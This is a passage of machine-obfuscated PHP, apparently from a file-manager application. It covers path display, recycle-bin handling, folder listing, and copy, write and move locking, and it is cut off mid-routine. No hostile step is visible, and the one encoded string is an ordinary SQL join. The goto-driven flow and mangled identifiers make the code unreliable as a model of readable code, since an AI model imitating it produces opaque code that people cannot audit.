!_get($GLOBALS, $EÉÖÜ¼‰Ñß[457])) { $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[189]] = !1; $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[188]] = !1; } } if ($c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]]) { $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[189]] = AuthModel::authCheckEdit($c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]][$EÉÖÜ¼‰Ñß[377]]); $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[188]] = AuthModel::authCheckView($c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]][$EÉÖÜ¼‰Ñß[377]]); } $this->groupPathDisplay($c½•óË¨—‡); } goto C¿„á¯õñ; fÆÌĞ†˜Ô†: $EÉÖÜ¼‰Ñß =& $_SERVER[Æ]; if (!defined($EÉÖÜ¼‰Ñß[427])) { return; } $E¹±Ô”ì„ = array(); goto fâæáÆÛòÀ; C¿„á¯õñ: } public function groupPathDisplay(&$A˜âùë†ˆ‡) { goto dõ†Ê îÌ; CÑ¡Ò“ÕÇñ: $A˜âùë†ˆ‡[$c–¡ÜÓÔßã[460]] = $B‹øÓõÈ[$c–¡ÜÓÔßã[461]]; $A˜âùë†ˆ‡[$c–¡ÜÓÔßã[380]] = $B‹øÓõÈ[$c–¡ÜÓÔßã[459]]; $A˜âùë†ˆ‡[$c–¡ÜÓÔßã[462]] = $B‹øÓõÈ[$c–¡ÜÓÔßã[463]]; goto fÀ«©–£Ó; fÌÒêê…: $C»ßéé†‚§ = $this->parentLevelArray($B‹øÓõÈ[$c–¡ÜÓÔßã[459]]); $eÑÑ­Ç´Æ = $c–¡ÜÓÔßã[33]; foreach ($C»ßéé†‚§ as $e¥½ÖÓª) { $c½áÑèî¬ë = Model($c–¡ÜÓÔßã[458])->getInfo($e¥½ÖÓª); $eÑÑ­Ç´Æ .= $c½áÑèî¬ë[$c–¡ÜÓÔßã[391]][$c–¡ÜÓÔßã[369]] . $c–¡ÜÓÔßã[47]; } goto CÑ¡Ò“ÕÇñ; dõ†Ê îÌ: $c–¡ÜÓÔßã =& $_SERVER[Æ]; if ($A˜âùë†ˆ‡[$c–¡ÜÓÔßã[371]] != self::TYPE_GROUP) { return; } $B‹øÓõÈ = Model($c–¡ÜÓÔßã[458])->getInfo($A˜âùë†ˆ‡[$c–¡ÜÓÔßã[456]]); goto fÌÒêê…; fÀ«©–£Ó: $A˜âùë†ˆ‡[$c–¡ÜÓÔßã[464]] = $eÑÑ­Ç´Æ . $B‹øÓõÈ[$c–¡ÜÓÔßã[391]][$c–¡ÜÓÔßã[369]]; goto DãŸ‰ÉâÙÍ; DãŸ‰ÉâÙÍ: } protected function _listAppendPath(&$AŠÅÀÈÓ†Ş) { goto D…‡²Âˆ¦; f…Æ‘ÒŸÉ: $a…Ğè¿›ƒµ = array(); foreach ($Fí©Ïøô¹Œ as $f­™É—› => $f»Ö™¯ÁÊ±) { if (!$f»Ö™¯ÁÊ±) { $a…Ğè¿›ƒµ[] = $f­™É—›; } } if ($a…Ğè¿›ƒµ) { $bƒ·êÓº½æ = array($e¾—™‡×ó[383] => array($e¾—™‡×ó[384], $a…Ğè¿›ƒµ)); if (count($a…Ğè¿›ƒµ) == 1) { $e±ªÆŒŸÂ² = $this->sourceInfo($a…Ğè¿›ƒµ[0]); $e±ªÆŒŸÂ² = is_array($e±ªÆŒŸÂ²) ? array($e±ªÆŒŸÂ²) : !1; } else { $e±ªÆŒŸÂ² = $this->field($e¾—™‡×ó[465])->where($bƒ·êÓº½æ)->select(); } $D¸ç„ì¦· = array_to_keyvalue($e±ªÆŒŸÂ², $e¾—™‡×ó[369], $e¾—™‡×ó[28]); $Fí©Ïøô¹Œ = array_merge_index($Fí©Ïøô¹Œ, $D¸ç„ì¦·); } goto CßÄÒöô¶; D…‡²Âˆ¦: $e¾—™‡×ó =& $_SERVER[Æ]; $Fí©Ïøô¹Œ = array(); foreach ($AŠÅÀÈÓ†Ş as &$b™ÙØÃ¢°¦) { $Fí©Ïøô¹Œ[$b™ÙØÃ¢°¦[$e¾—™‡×ó[369]]] = $b™ÙØÃ¢°¦[$e¾—™‡×ó[28]]; $cÑ˜øÕÅãæ = $this->parentLevelArray($b™ÙØÃ¢°¦[$e¾—™‡×ó[459]]); array_shift($cÑ˜øÕÅãæ); foreach ($cÑ˜øÕÅãæ as $a¦òÙÊŠ˜Œ) { if (!isset($Fí©Ïøô¹Œ[$a¦òÙÊŠ˜Œ])) { $Fí©Ïøô¹Œ[$a¦òÙÊŠ˜Œ] = 0; } } } goto f…Æ‘ÒŸÉ; CßÄÒöô¶: $AÆ’óÉ¢æ¨ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($AŠÅÀÈÓ†Ş as &$b™ÙØÃ¢°¦) { goto D˜ˆõ¦Ö½; EÇ‰åõ˜ƒ: if ($cÑ˜øÕÅãæ) { $AÑğƒÇ¬¨ .= $b™ÙØÃ¢°¦[$e¾—™‡×ó[28]]; } if ($b™ÙØÃ¢°¦[$e¾—™‡×ó[370]]) { $AÑğƒÇ¬¨ .= $e¾—™‡×ó[8]; } $b™ÙØÃ¢°¦[$e¾—™‡×ó[466]] = str_replace($e¾—™‡×ó[467], $e¾—™‡×ó[8], $AÑğƒÇ¬¨); goto FÜ‹ÎÎ‡ªİ; FÜ‹ÎÎ‡ªİ: $dˆçÃ–ä½Ò = trim($b™ÙØÃ¢°¦[$e¾—™‡×ó[466]], $e¾—™‡×ó[8]); if ($b™ÙØÃ¢°¦[$e¾—™‡×ó[461]] == $e¾—™‡×ó[468] && $dˆçÃ–ä½Ò) { $b™ÙØÃ¢°¦[$e¾—™‡×ó[28]] = $dˆçÃ–ä½Ò; } $this->_listAppendPathRecycle($b™ÙØÃ¢°¦, $cÑ˜øÕÅãæ, $AÆ’óÉ¢æ¨); goto C™ŞŠÀ•Ïê; D˜ˆõ¦Ö½: $cÑ˜øÕÅãæ = $this->parentLevelArray($b™ÙØÃ¢°¦[$e¾—™‡×ó[459]]); $AÑğƒÇ¬¨ = $this->_listAppendPathRoot($b™ÙØÃ¢°¦, $cÑ˜øÕÅãæ); foreach ($cÑ˜øÕÅãæ as $a¦òÙÊŠ˜Œ) { if (isset($Fí©Ïøô¹Œ[$a¦òÙÊŠ˜Œ])) { $AÑğƒÇ¬¨ .= $Fí©Ïøô¹Œ[$a¦òÙÊŠ˜Œ] . $e¾—™‡×ó[8]; } } goto EÇ‰åõ˜ƒ; C™ŞŠÀ•Ïê: } goto cªŸà–÷ğ; cªŸà–÷ğ: } private function _listAppendPathRecycle(&$eÆàƒä»š, $BÚŒŠ±•¦Š, $e¡ñùæÖˆÈ) { goto F™ãÙñ®ğ¬; EçÙˆÓ‰‡ä: $E¾‚ä•…Ò˜ = explode($CÔì¤éÖÅ[8], trim($eÆàƒä»š[$CÔì¤éÖÅ[466]], $CÔì¤éÖÅ[8])); $BÉ”·¥‹ÊË = implode($CÔì¤éÖÅ[8], array_slice($E¾‚ä•…Ò˜, 2)); $eÆàƒä»š[$CÔì¤éÖÅ[466]] = $CÔì¤éÖÅ[8] . LNG($CÔì¤éÖÅ[469]) . $CÔì¤éÖÅ[8] . ltrim($BÉ”·¥‹ÊË, $CÔì¤éÖÅ[8]); goto aç÷—²Åš¯; F™ãÙñ®ğ¬: $CÔì¤éÖÅ =& $_SERVER[Æ]; if (intval($eÆàƒä»š[$CÔì¤éÖÅ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($e¡ñùæÖˆÈ, $BÚŒŠ±•¦Š) && $eÆàƒä»š[$CÔì¤éÖÅ[369]] != $e¡ñùæÖˆÈ) { return; } goto EçÙˆÓ‰‡ä; aç÷—²Åš¯: $eÆàƒä»š[$CÔì¤éÖÅ[459]] = $CÔì¤éÖÅ[470] . implode($CÔì¤éÖÅ[47], array_slice($BÚŒŠ±•¦Š, 1)) . $CÔì¤éÖÅ[47]; if ($eÆàƒä»š[$CÔì¤éÖÅ[369]] == $e¡ñùæÖˆÈ) { $eÆàƒä»š[$CÔì¤éÖÅ[459]] = $CÔì¤éÖÅ[470]; $eÆàƒä»š[$CÔì¤éÖÅ[461]] = $CÔì¤éÖÅ[468]; $eÆàƒä»š[$CÔì¤éÖÅ[28]] = LNG($CÔì¤éÖÅ[469]); } $eÆàƒä»š[$CÔì¤éÖÅ[471]] = $CÔì¤éÖÅ[472]; goto BÉ“Ì˜í†‡; BÉ“Ì˜í†‡: } protected function _listAppendPathRoot(&$eôµµ“Èõ, $aâæëùî¶İ) { $bé°³ñÃ® =& $_SERVER[Æ]; $DŸÍË«–‰ = $bé°³ñÃ®[33]; if ($eôµµ“Èõ[$bé°³ñÃ®[371]] == self::TYPE_USER) { if (defined($bé°³ñÃ®[427]) && $eôµµ“Èõ[$bé°³ñÃ®[456]] == USER_ID) { $DŸÍË«–‰ = LNG($bé°³ñÃ®[473]); if (!$aâæëùî¶İ) { $eôµµ“Èõ[$bé°³ñÃ®[28]] = $DŸÍË«–‰; } } else { $dÔÅæ­‰« = Model($bé°³ñÃ®[474])->getInfoSimple($eôµµ“Èõ[$bé°³ñÃ®[456]]); $DŸÍË«–‰ = LNG($bé°³ñÃ®[475]) . $bé°³ñÃ®[157] . $dÔÅæ­‰«[$bé°³ñÃ®[28]] . $bé°³ñÃ®[476]; } } else { if ($eôµµ“Èõ[$bé°³ñÃ®[371]] == self::TYPE_GROUP) { $dÔÅæ­‰« = Model($bé°³ñÃ®[458])->getInfoSimple($eôµµ“Èõ[$bé°³ñÃ®[456]]); $DŸÍË«–‰ = $dÔÅæ­‰«[$bé°³ñÃ®[28]]; } else { if ($eôµµ“Èõ[$bé°³ñÃ®[371]] == self::TYPE_SYSTEM) { $dÔÅæ­‰« = $this->sourceInfo($aâæëùî¶İ[0], !0); $DŸÍË«–‰ = $dÔÅæ­‰«[$bé°³ñÃ®[28]]; } } } $DŸÍË«–‰ = $DŸÍË«–‰ ? $bé°³ñÃ®[8] . $DŸÍË«–‰ . $bé°³ñÃ®[8] : $bé°³ñÃ®[8]; return $DŸÍË«–‰; } protected function _listAppendUser(&$aô‘Úæ¬æŞ) { $dƒÖ£¼—„È =& $_SERVER[Æ]; $Fˆ‹¹Îˆ¬ = array_to_keyvalue($aô‘Úæ¬æŞ, $dƒÖ£¼—„È[33], $dƒÖ£¼—„È[378]); $f‚……Ìôù¤ = array_to_keyvalue($aô‘Úæ¬æŞ, $dƒÖ£¼—„È[33], $dƒÖ£¼—„È[379]); $CÊÌó×®˜ø = array_merge($Fˆ‹¹Îˆ¬, $f‚……Ìôù¤); $eã…Ûôæ = Model($dƒÖ£¼—„È[477])->userListInfo($CÊÌó×®˜ø); foreach ($aô‘Úæ¬æŞ as &$D‡Ï˜Ÿˆ) { $E¨¦Å®÷ = $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[378]]; $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[378]] = $eã…Ûôæ[$E¨¦Å®÷] ? $eã…Ûôæ[$E¨¦Å®÷] : !1; $E¨¦Å®÷ = $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[379]]; $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[379]] = $eã…Ûôæ[$E¨¦Å®÷] ? $eã…Ûôæ[$E¨¦Å®÷] : !1; if (isset($D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[417]]) && $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[417]][$dƒÖ£¼—„È[478]]) { $a›Ÿë­„Şƒ = $GLOBALS[$dƒÖ£¼—„È[6]][$dƒÖ£¼—„È[84]][$dƒÖ£¼—„È[479]]; if ($D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[417]][$dƒÖ£¼—„È[480]] <= time() - $a›Ÿë­„Şƒ) { $this->metaSet($D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[369]], $dƒÖ£¼—„È[478], null); $this->metaSet($D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[369]], $dƒÖ£¼—„È[480], null); unset($D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[417]][$dƒÖ£¼—„È[478]]); continue; } $f’ŠĞ†Ÿå« = $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[417]][$dƒÖ£¼—„È[478]]; $D‡Ï˜Ÿˆ[$dƒÖ£¼—„È[417]][$dƒÖ£¼—„È[481]] = Model($dƒÖ£¼—„È[477])->getInfoSimpleOuter($f’ŠĞ†Ÿå«); } } } public function parentLevelArray($b¡é”ËóÛ) { $aôè½«İâŞ =& $_SERVER[Æ]; $b¡é”ËóÛ = explode($aôè½«İâŞ[47], trim($b¡é”ËóÛ, $aôè½«İâŞ[47])); return array_remove_value($b¡é”ËóÛ, $aôè½«İâŞ[468]); } public function listAll($EÓ±³¾¸Ë¤) { goto dø°†÷”Û; B™¡«‡²ê: $B›ØŞŒ£„ = $c¾ –äİäª[486]; $Aåß¯®ˆ»“ = "\114\x45\106\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\x69\157\137\146\151\x6c\x65\40\146\x69\154\x65\40\x6f\156\x20\163\157\165\x72\143\x65\x2e\x66\151\154\145\x49\104\x20\x3d\x20\x66\151\x6c\x65\x2e\x66\x69\x6c\145\x49\x44"; $bŠÛ ÂØç² = $this->alias($c¾ –äİäª[487])->field($B›ØŞŒ£„)->where($cå™¨Ø°¥˜)->join($Aåß¯®ˆ»“)->select(); goto B•³˜ñ¿½˜; fïÜÌì¶­“: $BóÔÄ†Š = array(); foreach ($bŠÛ ÂØç² as $a£Ú…Ÿ¨¥Æ => $F½ƒÂÒ‘¿) { goto B–Ìƒ¡½Õª; B–Ìƒ¡½Õª: $eç°Ùï®ÉÒ = $this->parentLevelArray($F½ƒÂÒ‘¿[$c¾ –äİäª[459]]); array_shift($eç°Ùï®ÉÒ); $bÆÖé÷¼Í¡ = $A›ã…êÄ½…; goto B„…÷Àƒ‘©; B„…÷Àƒ‘©: for ($B‰–Š¦ºÌš = 0; $B‰–Š¦ºÌš < count($eç°Ùï®ÉÒ); $B‰–Š¦ºÌš++) { $bÆÖé÷¼Í¡ .= $bŠÛ ÂØç²[$eç°Ùï®ÉÒ[$B‰–Š¦ºÌš]][$c¾ –äİäª[28]] . $c¾ –äİäª[8]; } $bÆÖé÷¼Í¡ .= $F½ƒÂÒ‘¿[$c¾ –äİäª[28]]; if ($F½ƒÂÒ‘¿[$c¾ –äİäª[370]]) { $bÆÖé÷¼Í¡ .= $c¾ –äİäª[8]; } goto A«¼òØßó; B¥§Î„È®: if (!$F½ƒÂÒ‘¿[$c¾ –äİäª[370]]) { $EìÑĞïĞÚê[$c¾ –äİäª[419]] = $F½ƒÂÒ‘¿[$c¾ –äİäª[419]]; $EìÑĞïĞÚê[$c¾ –äİäª[489]] = $F½ƒÂÒ‘¿[$c¾ –äİäª[75]]; } $BóÔÄ†Š[] = $EìÑĞïĞÚê; goto BØ„®Îãè; A«¼òØßó: $bÆÖé÷¼Í¡ = str_replace($c¾ –äİäª[467], $c¾ –äİäª[8], $bÆÖé÷¼Í¡); $bÆÖé÷¼Í¡ = str_replace($c¾ –äİäª[467], $c¾ –äİäª[8], $bÆÖé÷¼Í¡); $EìÑĞïĞÚê = array($c¾ –äİäª[387] => str_replace($c¾ –äİäª[467], $c¾ –äİäª[8], $bÆÖé÷¼Í¡), $c¾ –äİäª[488] => intval($F½ƒÂÒ‘¿[$c¾ –äİäª[370]]), $c¾ –äİäª[391] => $this->pathInfoFilter($F½ƒÂÒ‘¿, !0)); goto B¥§Î„È®; BØ„®Îãè: } return $BóÔÄ†Š; goto f¶Ğœêö†; B•³˜ñ¿½˜: $this->_listAppendAuth($bŠÛ ÂØç²); $this->_listAppendUser($bŠÛ ÂØç²); $this->_listAppendPath($bŠÛ ÂØç²); goto fôÆÔóëÉ; fôÆÔóëÉ: $bŠÛ ÂØç² = array_to_keyvalue($bŠÛ ÂØç², $c¾ –äİäª[369]); $A›ã…êÄ½… = "\57{$F‚Ç¨ÊÁˆ»[$c¾ –äİäª[28]]}\57"; $A›ã…êÄ½… = $A›ã…êÄ½… == $c¾ –äİäª[467] ? $c¾ –äİäª[8] : $A›ã…êÄ½…; goto fïÜÌì¶­“; dø°†÷”Û: $c¾ –äİäª =& $_SERVER[Æ]; $F‚Ç¨ÊÁˆ» = $this->sourceInfo($EÓ±³¾¸Ë¤); $cå™¨Ø°¥˜ = array($c¾ –äİäª[482] => array($c¾ –äİäª[483], $F‚Ç¨ÊÁˆ»[$c¾ –äİäª[459]] . $EÓ±³¾¸Ë¤ . $c¾ –äİäª[484]), $c¾ –äİäª[485] => 0); goto B™¡«‡²ê; f¶Ğœêö†: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($CæŠ¤§Òë§) { goto f‡¯¹ğèÕ‹; f´í†¬Ò¾™: $cÂ†“¼’ = 1; $this->_lockEvent($CæŠ¤§Òë§, array($Bø“çÆµë‚[491], $Bø“çÆµë‚[492]), $cÂ†“¼’); $this->_lockParent($CæŠ¤§Òë§, array($Bø“çÆµë‚[492]), $cÂ†“¼’); goto dœ‹àß ‘Ø; dœ‹àß ‘Ø: $this->_lockEvent($CæŠ¤§Òë§, array($Bø“çÆµë‚[493], $Bø“çÆµë‚[494]), $cÂ†“¼’); $this->_lockCheckEnd($Bø“çÆµë‚[490], $CæŠ¤§Òë§); goto A²£“öÀ—; f‡¯¹ğèÕ‹: $Bø“çÆµë‚ =& $_SERVER[Æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Bø“çÆµë‚[490], $CæŠ¤§Òë§); goto f´í†¬Ò¾™; A²£“öÀ—: } public function lockCopyEnd($AâÔ‚Ç™–Ë) { $A»¬ÉïÌ› =& $_SERVER[Æ]; if (!$this->allowLock()) { return; } $BˆĞİóº×³ = 0; $this->_lockEvent($AâÔ‚Ç™–Ë, array($A»¬ÉïÌ›[491], $A»¬ÉïÌ›[492]), $BˆĞİóº×³); $this->_lockParent($AâÔ‚Ç™–Ë, array($A»¬ÉïÌ›[492]), $BˆĞİóº×³); $this->_lockEvent($AâÔ‚Ç™–Ë, array($A»¬ÉïÌ›[493], $A»¬ÉïÌ›[494]), $BˆĞİóº×³); } public function lockWriteStart($e¼æ¢ë, $d®¢ŠŒ‡åç = '') { goto cî‚á¼İá; cî‚á¼İá: $bØ²«Î ìÆ =& $_SERVER[Æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($bØ²«Î ìÆ[491], $e¼æ¢ë); goto FÍÃàÕˆ©²; d‰ˆøê‚µ: $this->_lockParent($e¼æ¢ë, array($bØ²«Î ìÆ[490], $bØ²«Î ìÆ[492]), $CÊÚÙ¯‹ƒİ); $this->_lockCheckEnd($bØ²«Î ìÆ[491], $e¼æ¢ë); goto EæÆ°Ç¶; FÍÃàÕˆ©²: $CÊÚÙ¯‹ƒİ = 1; $this->_lockKey($bØ²«Î ìÆ[495] . $e¼æ¢ë . $bØ²«Î ìÆ[91] . $d®¢ŠŒ‡åç, $CÊÚÙ¯‹ƒİ); $this->_lockEvent($e¼æ¢ë, array($bØ²«Î ìÆ[490], $bØ²«Î ìÆ[492]), $CÊÚÙ¯‹ƒİ); goto d‰ˆøê‚µ; EæÆ°Ç¶: } public function lockWriteEnd($cÕÁöñ¶ôà, $A÷¡¹ÚºêŠ = '') { $d­†ñàé• =& $_SERVER[Æ]; if (!$this->allowLock()) { return; } $dËØ™ŞáÛÎ = 0; $this->_lockKey($d­†ñàé•[495] . $cÕÁöñ¶ôà . $d­†ñàé•[91] . $A÷¡¹ÚºêŠ, $dËØ™ŞáÛÎ); $this->_lockEvent($cÕÁöñ¶ôà, array($d­†ñàé•[490], $d­†ñàé•[492]), $dËØ™ŞáÛÎ); $this->_lockParent($cÕÁöñ¶ôà, array($d­†ñàé•[490], $d­†ñàé•[492]), $dËØ™ŞáÛÎ); } public function lockMoveStart($f‘¯°¢ƒË) { goto A Á’Ø•Æ; A Á’Ø•Æ: $FŒ…ŞÖ„É‘ =& $_SERVER[Æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($FŒ…ŞÖ„É‘[492], $f‘¯°¢ƒË); goto d—±Ïí¤°Ç; d—±Ïí¤°Ç: $AºöÉÄÂ°Ş = 1; $this->_lockKey($FŒ…ŞÖ„É‘[496] . $f‘¯°¢ƒË, $AºöÉÄÂ°Ş); $this->_lockEvent($f‘¯°¢ƒË, array($FŒ…ŞÖ„É‘[490], $FŒ…ŞÖ„É‘[491]), $AºöÉÄÂ°Ş); goto B«Å†Œ“­Ô; B«Å†Œ“­Ô: $this->_lockParent($f‘¯°¢ƒË, array($FŒ…ŞÖ„É‘[490], $FŒ…ŞÖ„É‘[492]), $AºöÉÄÂ°Ş); $this->_lockEvent($f‘¯°¢ƒË, array($FŒ…ŞÖ„É‘[497], $FŒ…ŞÖ„É‘[493], $FŒ…ŞÖ„É‘[494]), $AºöÉÄÂ°Ş); $this->_lockCheckEnd($FŒ…ŞÖ„É‘[492], $f‘¯°¢ƒË); goto f–…Á®æî; f–…Á®æî: } public function lockMoveEnd($fØğšã·´²) { goto C¤Ùõ; cªßªß¯†: $this->_lockEvent($fØğšã·´², array($A…«ŞíÊÉÄ[497], $A…«ŞíÊÉÄ[493], $A…«ŞíÊÉÄ[494]), $Eğ¿¥„Ò¬·); goto eìÃ‘ƒŒ; bï£í‡‘•¤: $this->_lockKey($A…«ŞíÊÉÄ[496] . $fØğšã·´², $Eğ¿¥„Ò¬·); $this->_lockEvent($fØğšã·´², array($A…«ŞíÊÉÄ[490], $A…«ŞíÊÉÄ[491]), $Eğ¿¥„Ò¬·); $this->_lockParent($fØğšã·´², array($A…«ŞíÊÉÄ[490], $A…«ŞíÊÉÄ[492]), $Eğ¿¥„Ò¬·); goto cªßªß¯†; C¤Ùõ: $A…«ŞíÊÉÄ =& $_SERVER[Æ]; if (!$this->allowLock()) { return; } $Eğ¿¥„Ò¬· = 0; goto bï£í‡‘•¤; eìÃ‘ƒŒ: } private function _lockCheck($f¤ŒÏ–İœ·, $aŠ¾š‘¥’Ù) { goto BÉØëì¡œ; BÕ‹®Âèº“: $a„ÓÖ¯èÜÃ = array_reverse($this->parentLevelArray($Bõ‡ÛŞÑõ[$A„ôœ’ÍŒ»[459]])); foreach ($a„ÓÖ¯èÜÃ as $eŞìø½ªÉİ) { $b–´Í”…Ü„ = $f¤ŒÏ–İœ· . $A„ôœ’ÍŒ»[499] . $eŞìø½ªÉİ; if (CacheLock::lockGet($A„ôœ’ÍŒ»[500] . $b–´Í”…Ü„)) { $Bõ‡ÛŞÑõ = $this->sourceInfo($eŞìø½ªÉİ); CacheLock::setErrorMsg($A„ôœ’ÍŒ»[157] . htmlspecialchars($Bõ‡ÛŞÑõ[$A„ôœ’ÍŒ»[28]]) . $A„ôœ’ÍŒ»[476] . $Fåğ—–ÃĞ); $this->_lockKey($b–´Í”…Ü„, 1); $this->_lockKey($b–´Í”…Ü„, 0); } } goto F…•„ºµê; F‹›ÂÒãĞÄ: $this->_lockTimeStart[$b–´Í”…Ü„] = timeFloat(); if (!is_array($Bõ‡ÛŞÑõ)) { return; } $Fåğ—–ÃĞ = LNG($A„ôœ’ÍŒ»[498]); goto dÀ²›ã÷ ¯; BÉØëì¡œ: $A„ôœ’ÍŒ» =& $_SERVER[Æ]; $Bõ‡ÛŞÑõ = $this->sourceInfo($aŠ¾š‘¥’Ù); $b–´Í”…Ü„ = $f¤ŒÏ–İœ· . $A„ôœ’ÍŒ»[91] . $aŠ¾š‘¥’Ù; goto F‹›ÂÒãĞÄ; dÀ²›ã÷ ¯: CacheLock::setErrorMsg($A„ôœ’ÍŒ»[157] . htmlspecialchars($Bõ‡ÛŞÑõ[$A„ôœ’ÍŒ»[28]]) . $A„ôœ’ÍŒ»[476] . $Fåğ—–ÃĞ); $this->_lockKey($b–´Í”…Ü„, 1); $this->_lockKey($b–´Í”…Ü„, 0); goto BÕ‹®Âèº“; F…•„ºµê: } private function _lockCheckEnd($EŒˆÓàöÌ, $fÊÉ‹¤¥ê­) { goto FŒê¦ªËŒ‰; AÔïˆŠÉÁ: if (!isset($this->_lockTimeStart[$Dã¤’ğÜŞª])) { return; } $C¦Ê´ˆ´Á¬ = timeFloat() - $this->_lockTimeStart[$Dã¤’ğÜŞª]; unset($this->_lockTimeStart[$Dã¤’ğÜŞª]); goto f¢è“ŒëŸÃ; FŒê¦ªËŒ‰: $C‚ê«°ÎÆ =& $_SERVER[Æ]; $Dã¤’ğÜŞª = $EŒˆÓàöÌ . $C‚ê«°ÎÆ[91] . $fÊÉ‹¤¥ê­; CacheLock::setErrorMsg($C‚ê«°ÎÆ[361]); goto AÔïˆŠÉÁ; f¢è“ŒëŸÃ: if ($C¦Ê´ˆ´Á¬ > 0.5) { unset(self::$cacheSourceInfo[$C‚ê«°ÎÆ[410] . $fÊÉ‹¤¥ê­]); } $FÓÍÑ½¢Í = $this->sourceInfo($fÊÉ‹¤¥ê­); if (!$FÓÍÑ½¢Í) { show_json(LNG($C‚ê«°ÎÆ[101]), !1); } goto bÖìÕÓî‘‡; bÖìÕÓî‘‡: } private function _lockParent($E‘Ò‡Àà†, $Fİ¾ÈéáÎ, $B¨Œí™ììà) { if (!$this->autoLockSet) { return; } $DÚ…Š¿¾¹® = $this->sourceInfo($E‘Ò‡Àà†); if (!is_array($DÚ…Š¿¾¹®)) { return; } $EÇøÔ—È÷š = array_reverse($this->parentLevelArray($DÚ…Š¿¾¹®[$_SERVER[Æ][459]])); foreach ($EÇøÔ—È÷š as $C‹ÅÀ‹´) { $this->_lockEvent($C‹ÅÀ‹´, $Fİ¾ÈéáÎ, $B¨Œí™ììà); } } private function _lockEvent($B‡Öº³ÏØ, $D¤Îó÷È†§, $eâŠ ‰öæ) { $E°‰ îé£‰ =& $_SERVER[Æ]; if (!$this->autoLockSet) { return; } foreach ($D¤Îó÷È†§ as $D¡ÕˆµÚÚñ) { $C‰Š³ÉàĞ˜ = $D¡ÕˆµÚÚñ . $E°‰ îé£‰[91] . $B‡Öº³ÏØ; if ($eâŠ ‰öæ && CacheLock::lockGet($E°‰ îé£‰[500] . $C‰Š³ÉàĞ˜)) { continue; } $this->_lockKey($C‰Š³ÉàĞ˜, $eâŠ ‰öæ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($AÕ¿æ¿ÃÎ, $c“Òæî²Òš = 1) { $AÎ¨¶ÃÕ¯ = $_SERVER[Æ][500] . md5($AÕ¿æ¿ÃÎ); if ($c“Òæî²Òš) { if (isset(self::$_lockItemArr[$AÎ¨¶ÃÕ¯])) { return; } self::$_lockItemArr[$AÎ¨¶ÃÕ¯] = 1; CacheLock::lock($AÎ¨¶ÃÕ¯, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$AÎ¨¶ÃÕ¯])) { return; } unset(self::$_lockItemArr[$AÎ¨¶ÃÕ¯]); CacheLock::unlock($AÎ¨¶ÃÕ¯); } } public function isParentOf($få¸¿´ë³, $Dèøí´ªñ¾) { goto aµ…¶ñæ×¦; F ôÚå¬‚ó: return $Eá¢»¸ÁÇó; goto BÔ‚Üì´¬ß; f™¦ÌÔî¾ : $f‹å‘³‘²½ = $e®¾áó×§Ú[$C«×Ô¢ë±[459]] . $e®¾áó×§Ú[$C«×Ô¢ë±[369]] . $C«×Ô¢ë±[47]; $cŠ‘¥ä¶„· = $cÚ´˜Ä¨Æ[$C«×Ô¢ë±[459]] . $cÚ´˜Ä¨Æ[$C«×Ô¢ë±[369]] . $C«×Ô¢ë±[47]; $Eá¢»¸ÁÇó = strpos($cŠ‘¥ä¶„·, $f‹å‘³‘²½) === 0; goto F ôÚå¬‚ó; aµ…¶ñæ×¦: $C«×Ô¢ë± =& $_SERVER[Æ]; $e®¾áó×§Ú = $this->sourceInfo($få¸¿´ë³); $cÚ´˜Ä¨Æ = $this->sourceInfo($Dèøí´ªñ¾); goto f™¦ÌÔî¾ ; BÔ‚Üì´¬ß: } private $targetIsDelete = 0; public function copy($bÚÀ­‰·Ú¡, $d°à‚Áäõğ, $A„İ·”ë‘ß = REPEAT_REPLACE, $F®‚¼âÔ×… = '') { goto b·½ªº“‡æ; eøƒ™¸ÄØ: $this->saveAll($e›¢¿ßê§Ğ[$céÕÓ†ïò–[503]]); Model($céÕÓ†ïò–[167])->linkAdd($e›¢¿ßê§Ğ[$céÕÓ†ïò–[501]]); $this->folderSizeReset($d°à‚Áäõğ); goto B‡¢¦µ´¿‡; aÂ‰ãæòÀ: $this->_childrenListClear(); $this->lockCopyEnd($bÚÀ­‰·Ú¡); $this->lockWriteEnd($d°à‚Áäõğ, $eÓ®äÃ“‘); goto eì¶ÖŠ¤¸©; b·½ªº“‡æ: $céÕÓ†ïò– =& $_SERVER[Æ]; $A—“«õÁ– = $this->sourceInfo($bÚÀ­‰·Ú¡); $B±„‚ÑÊ‹ = $this->sourceInfo($d°à‚Áäõğ); goto FÉ®„…ïÓî; C¢³ÇÎº‹ : $this->lockCopyStart($bÚÀ­‰·Ú¡); $this->lockWriteStart($d°à‚Áäõğ, $eÓ®äÃ“‘); $e›¢¿ßê§Ğ = array($céÕÓ†ïò–[501] => array(), $céÕÓ†ïò–[502] => array(), $céÕÓ†ïò–[503] => array()); goto bĞ•Çì©‚; bĞ•Çì©‚: $this->targetIsDelete = intval($A—“«õÁ–[$céÕÓ†ïò–[397]]); $AÁ¤ËÃ½µø = $this->fileNameExistCache($d°à‚Áäõğ, $A—“«õÁ–[$céÕÓ†ïò–[28]]); $B§ÖØ‡Óé³ = $this->_copy($bÚÀ­‰·Ú¡, $d°à‚Áäõğ, 